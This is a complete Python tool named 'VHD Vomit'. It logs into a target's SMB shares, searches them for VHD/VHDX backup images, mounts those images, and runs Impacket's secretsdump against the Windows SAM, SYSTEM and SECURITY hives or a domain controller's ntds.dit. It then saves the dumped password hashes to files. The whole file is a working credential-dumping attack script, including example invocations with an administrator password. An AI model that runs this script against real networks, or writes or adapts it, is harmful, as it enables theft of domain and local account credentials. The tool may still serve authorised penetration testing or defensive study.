#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import getpass
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path

BANNER = r"""
 ██▒   █▓ ██░ ██ ▓█████▄     ██▒   █▓ ▒█████   ███▄ ▄███▓ ██▓▄▄▄█████▓
▓██░   █▒▓██░ ██▒▒██▀ ██▌   ▓██░   █▒▒██▒  ██▒▓██▒▀█▀ ██▒▓██▒▓  ██▒ ▓▒
 ▓██  █▒░▒██▀▀██░░██   █▌    ▓██  █▒░▒██░  ██▒▓██    ▓██░▒██▒▒ ▓██░ ▒░
  ▒██ █░░░▓█ ░██ ░▓█▄   ▌     ▒██ █░░▒██   ██░▒██    ▒██ ░██░░ ▓██▓ ░ 
   ▒▀█░  ░▓█▒░██▓░▒████▓       ▒▀█░  ░ ████▓▒░▒██▒   ░██▒░██░  ▒██▒ ░ 
   ░ ▐░   ▒ ░░▒░▒ ▒▒▓  ▒       ░ ▐░  ░ ▒░▒░▒░ ░ ▒░   ░  ░░▓    ▒ ░░   
   ░ ░░   ▒ ░▒░ ░ ░ ▒  ▒       ░ ░░    ░ ▒ ▒░ ░  ░      ░ ▒ ░    ░    
     ░░   ░  ░░ ░ ░ ░  ░         ░░  ░ ░ ░ ▒  ░      ░    ▒ ░  ░      
      ░   ░  ░  ░   ░             ░      ░ ░         ░    ░           
     ░            ░              ░                                     
        Mount SMB shares, extract VHD/VHDX backups, dump credentials
"""

try:
    from impacket.smbconnection import SMBConnection
except ImportError as e:
    print(f"[!] Impacket not available: {e}")
    print("[!] Install: sudo python3 -m pip install impacket")
    sys.exit(1)

def die(msg: str, code: int = 1):
    print(f"[!] {msg}")
    sys.exit(code)

def ensure_root():
    if os.geteuid() != 0:
        die("Must run as root (use sudo)")

def check_deps():
    from shutil import which
    missing = []
    
    if not Path("/sbin/mount.cifs").exists() and not which("mount.cifs"):
        missing.append("cifs-utils")
    if not which("qemu-nbd"):
        missing.append("qemu-utils")
    if not (which("ntfs-3g") or which("mount.ntfs")):
        missing.append("ntfs-3g")
    
    if missing:
        die(f"Missing dependencies: {', '.join(missing)}")

def decode_smb_field(val):
    if isinstance(val, bytes):
        for enc in ("utf-16le", "utf-8", "latin1"):
            try:
                return val.decode(enc).strip('\x00').strip()
            except:
                continue
        return ""
    return str(val).strip('\x00').strip()

def list_smb_shares(host: str, user: str, password: str, domain: str):
    try:
        conn = SMBConnection(host, host, sess_port=445)
        conn.login(user, password, domain)
        shares = conn.listShares()
        
        result = []
        for share in shares:
            try:
                name = decode_smb_field(share['shi1_netname'])
            except:
                try:
                    name = decode_smb_field(share.get('shi1_netname', ''))
                except:
                    continue
            
            if not name or name.upper() in ('IPC$', 'ADMIN$'):
                continue
            
            try:
                remark = decode_smb_field(share.get('shi1_remark', ''))
            except:
                remark = ""
            
            result.append((name, remark))
        
        conn.logoff()
        return result
    except Exception as e:
        die(f"SMB connection failed: {e}")

def select_shares(shares):
    print("\n[*] Available shares:")
    for i, (name, remark) in enumerate(shares, 1):
        desc = f" — {remark}" if remark else ""
        print(f"  [{i}] {name}{desc}")
    print("  [a] All shares")
    
    while True:
        choice = input("\n[?] Select shares (1,2,3 or 'a'): ").strip().lower()
        if choice in ('a', 'all'):
            return [s[0] for s in shares]
        
        try:
            indices = [int(x.strip()) for x in choice.split(',')]
            selected = [shares[i-1][0] for i in indices if 1 <= i <= len(shares)]
            if selected:
                return selected
        except:
            pass
        
        print("[!] Invalid selection")

def create_cifs_creds(domain: str, user: str, password: str):
    fd, path = tempfile.mkstemp(prefix="cifs_", suffix=".creds")
    os.close(fd)
    
    with open(path, 'w') as f:
        if domain:
            f.write(f"domain={domain}\n")
        if user:
            f.write(f"username={user}\n")
        if password:
            f.write(f"password={password}\n")
    
    os.chmod(path, 0o600)
    return path

def is_mounted(path: str):
    try:
        with open('/proc/mounts') as f:
            return any(line.split()[1] == path for line in f)
    except:
        return False

def force_umount(path: str):
    subprocess.run(['umount', path], capture_output=True)
    subprocess.run(['umount', '-l', path], capture_output=True)

def mount_cifs_share(host: str, share: str, creds_file: str):
    mnt = Path('/mnt') / share
    mnt.mkdir(parents=True, exist_ok=True)
    
    if is_mounted(str(mnt)):
        choice = input(f"[?] {mnt} already mounted. [r]euse/[u]nmount/[s]kip? ").lower()
        if choice == 'r':
            return str(mnt)
        elif choice == 'u':
            force_umount(str(mnt))
        else:
            return None
    
    unc = f"//{host}/{share}"
    opts = f"credentials={creds_file},vers=3.0,iocharset=utf8"
    
    cmd = ['mount', '-t', 'cifs', unc, str(mnt), '-o', opts]
    
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        print(f"[+] Mounted {share} at {mnt}")
        return str(mnt)
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to mount {share}: {e.stderr.decode()}")
        return None

def get_file_size_gb(path):
    try:
        size_bytes = Path(path).stat().st_size
        size_gb = size_bytes / (1024**3)
        return f"{size_gb:.2f}GB"
    except:
        return "??GB"

def find_vhdx_files(paths):
    vhdx_files = []
    for path in paths:
        p = Path(path)
        if not p.exists():
            continue
        
        print(f"[*] Scanning {p} for VHD/VHDX files...")
        for ext in ('*.vhdx', '*.vhd'):
            for vhdx in p.rglob(ext):
                if vhdx.is_file():
                    vhdx_files.append(str(vhdx))
                    size = get_file_size_gb(vhdx)
                    print(f"  [+] Found: {vhdx.name} ({size})")
    
    return vhdx_files

def select_vhdx(vhdx_list):
    if not vhdx_list:
        return []
    
    print("\n[*] VHD/VHDX files found:")
    for i, vhdx in enumerate(vhdx_list, 1):
        size = get_file_size_gb(vhdx)
        print(f"  [{i}] {Path(vhdx).name} ({size})")
    print("  [a] All")
    print("  [n] None")
    
    while True:
        choice = input("\n[?] Select VHD/VHDX files (1,2,3 or 'a'/'n'): ").lower()
        if choice in ('n', 'none'):
            return []
        if choice in ('a', 'all'):
            return vhdx_list
        
        try:
            indices = [int(x.strip()) for x in choice.split(',')]
            selected = [vhdx_list[i-1] for i in indices if 1 <= i <= len(vhdx_list)]
            if selected:
                return selected
        except:
            pass
        
        print("[!] Invalid selection")

def get_fs_type(device: str):
    try:
        result = subprocess.run(
            ['blkid', '-s', 'TYPE', '-o', 'value', device],
            capture_output=True,
            text=True
        )
        return result.stdout.strip().lower()
    except:
        return ""

def load_nbd_module():
    subprocess.run(['modprobe', 'nbd', 'max_part=16'], capture_output=True)

def find_free_nbd():
    for i in range(16):
        dev = f"/dev/nbd{i}"
        if not Path(dev).exists():
            continue
        
        pid_file = Path(f"/sys/block/nbd{i}/pid")
        if not pid_file.exists():
            return dev
    
    return None

def mount_vhdx_image(vhdx_path: str):
    vhdx_name = Path(vhdx_path).stem
    ext = Path(vhdx_path).suffix.lower()
    fmt = 'vhd' if ext == '.vhd' else 'vhdx'
    
    print(f"[*] Processing: {Path(vhdx_path).name}")
    
    load_nbd_module()
    nbd_dev = find_free_nbd()
    
    if not nbd_dev:
        print("[!] No free NBD device")
        return None, []
    
    try:
        subprocess.run(
            ['qemu-nbd', '--connect', nbd_dev, f'--format={fmt}', '--read-only', vhdx_path],
            check=True,
            capture_output=True
        )
        print(f"[+] Connected {nbd_dev}")
        
        time.sleep(3)
        subprocess.run(['partprobe', nbd_dev], capture_output=True)
        time.sleep(2)
        
        mounted = []
        partitions = sorted(Path('/dev').glob(f"{Path(nbd_dev).name}p*"))
        
        if not partitions:
            partitions = [Path(nbd_dev)]
        
        for part in partitions:
            fs = get_fs_type(str(part))
            
            if fs and 'ntfs' in fs:
                mnt = tempfile.mkdtemp(prefix=f"vhdx_{vhdx_name}_")
                
                try:
                    result = subprocess.run(
                        ['ntfs-3g', '-o', 'ro', str(part), mnt],
                        capture_output=True
                    )
                    
                    if result.returncode == 0:
                        mounted.append((str(part), mnt))
                        print(f"[+] Mounted {part}")
                    else:
                        os.rmdir(mnt)
                except Exception:
                    try:
                        os.rmdir(mnt)
                    except:
                        pass
            else:
                mnt = tempfile.mkdtemp(prefix=f"vhdx_{vhdx_name}_")
                
                try:
                    result = subprocess.run(
                        ['ntfs-3g', '-o', 'ro,force', str(part), mnt],
                        capture_output=True
                    )
                    
                    if result.returncode == 0 and list(Path(mnt).iterdir()):
                        mounted.append((str(part), mnt))
                        print(f"[+] Mounted {part}")
                    else:
                        subprocess.run(['umount', mnt], capture_output=True)
                        os.rmdir(mnt)
                except:
                    try:
                        os.rmdir(mnt)
                    except:
                        pass
        
        if not mounted:
            subprocess.run(['qemu-nbd', '--disconnect', nbd_dev], capture_output=True)
            print("[!] No mountable filesystems")
            return None, []
        
        return nbd_dev, mounted
        
    except Exception as e:
        subprocess.run(['qemu-nbd', '--disconnect', nbd_dev], capture_output=True)
        print(f"[!] Mount failed: {e}")
        return None, []

def cleanup_vhdx(nbd_dev, mounts):
    for part, mnt in mounts:
        subprocess.run(['umount', mnt], capture_output=True)
        subprocess.run(['umount', '-l', mnt], capture_output=True)
        try:
            os.rmdir(mnt)
        except:
            pass
    
    if nbd_dev:
        subprocess.run(['qemu-nbd', '--disconnect', nbd_dev], capture_output=True)

def run_secretsdump(args, outfile):
    from shutil import which
    
    secretsdump_path = which('secretsdump.py')
    
    if not secretsdump_path:
        user_home = os.path.expanduser('~')
        sudo_user = os.environ.get('SUDO_USER')
        
        possible_paths = [
            f'/home/{sudo_user}/.local/bin/secretsdump.py' if sudo_user else None,
            f'{user_home}/.local/bin/secretsdump.py',
            '/usr/local/bin/secretsdump.py',
        ]
        
        for path in possible_paths:
            if path and Path(path).exists():
                secretsdump_path = path
                break
    
    if not secretsdump_path:
        print("[!] secretsdump.py not found")
        return
    
    cmd = [secretsdump_path] + args
    
    print(f"[*] Running secretsdump -> {outfile}")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        print(result.stdout)
        
        with open(outfile, 'w') as f:
            f.write(result.stdout)
        
        if result.stderr:
            print(f"[!] Errors: {result.stderr}")
        
        if Path(outfile).stat().st_size > 0:
            print(f"[+] Output saved to {outfile}")
        else:
            print(f"[!] Dump failed (empty output)")
    except Exception as e:
        print(f"[!] Exception: {e}")

def extract_credentials(vhdx_path: str):
    hostname = Path(vhdx_path).stem
    
    nbd_dev, mounts = mount_vhdx_image(vhdx_path)
    if not nbd_dev:
        return
    
    try:
        dumped = False
        
        for part, mnt in mounts:
            root = Path(mnt)
            
            config_paths = [
                root / 'Windows' / 'System32' / 'config',
                root / 'WINDOWS' / 'System32' / 'config',
                root / 'windows' / 'system32' / 'config'
            ]
            
            config = None
            for cp in config_paths:
                if cp.exists():
                    config = cp
                    break
            
            if not config:
                continue
            
            sam = config / 'SAM'
            system = config / 'SYSTEM'
            security = config / 'SECURITY'
            
            ntds_paths = [
                root / 'Windows' / 'NTDS' / 'ntds.dit',
                root / 'WINDOWS' / 'NTDS' / 'ntds.dit',
                root / 'windows' / 'ntds' / 'ntds.dit'
            ]
            
            ntds = None
            for np in ntds_paths:
                if np.exists():
                    ntds = np
                    break
            
            if ntds and system.exists():
                print(f"[+] Domain Controller backup detected")
                run_secretsdump(
                    ['-ntds', str(ntds), '-system', str(system), 'LOCAL'],
                    f"{hostname}_secretsdump.txt"
                )
                dumped = True
            
            if sam.exists() and system.exists():
                print(f"[+] SAM database found")
                
                args = ['-sam', str(sam), '-system', str(system)]
                
                if security.exists():
                    args.extend(['-security', str(security)])
                
                args.append('LOCAL')
                run_secretsdump(args, f"{hostname}_secretsdump.txt")
                dumped = True
    
    finally:
        cleanup_vhdx(nbd_dev, mounts)

def main():
    print(BANNER)
    
    ensure_root()
    check_deps()
    
    parser = argparse.ArgumentParser(
        description='Mount SMB shares, find VHD/VHDX backups, extract credentials',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  Null authentication:
    %(prog)s -t 192.168.1.10
  
  With credentials:
    %(prog)s -t 192.168.1.10 -u administrator -p Password123 -d CORP
        '''
    )
    parser.add_argument('-t', '--target', required=True, help='Target host IP or hostname')
    parser.add_argument('-u', '--username', default='', help='Username (default: null auth)')
    parser.add_argument('-p', '--password', default='', help='Password (will prompt if username provided without password)')
    parser.add_argument('-d', '--domain', default='', help='Domain name')
    
    args = parser.parse_args()
    
    user = args.username
    password = args.password
    domain = args.domain
    host = args.target
    
    if user and not password:
        password = getpass.getpass("[?] Password: ")
    
    auth_desc = "null authentication" if not user else f"{domain + '\\' if domain else ''}{user}"
    print(f"[*] Connecting to {host} with {auth_desc}...")
    
    shares = list_smb_shares(host, user, password, domain)
    
    if not shares:
        die("No accessible shares found")
    
    selected = select_shares(shares)
    creds = create_cifs_creds(domain, user, password)
    
    mounted_shares = []
    
    try:
        for share in selected:
            mnt = mount_cifs_share(host, share, creds)
            if mnt:
                mounted_shares.append(mnt)
        
        if not mounted_shares:
            die("No shares mounted successfully")
        
        vhdx_files = find_vhdx_files(mounted_shares)
        
        if not vhdx_files:
            print("[!] No VHD/VHDX files found")
            return
        
        selected_vhdx = select_vhdx(vhdx_files)
        
        for vhdx in selected_vhdx:
            extract_credentials(vhdx)
        
        print("\n[+] Complete")
    
    finally:
        print("[*] Cleaning up...")
        for mnt in mounted_shares:
            if is_mounted(mnt):
                force_umount(mnt)
                print(f"[+] Unmounted {mnt}")
        
        try:
            os.remove(creds)
        except:
            pass

if __name__ == '__main__':
    main()
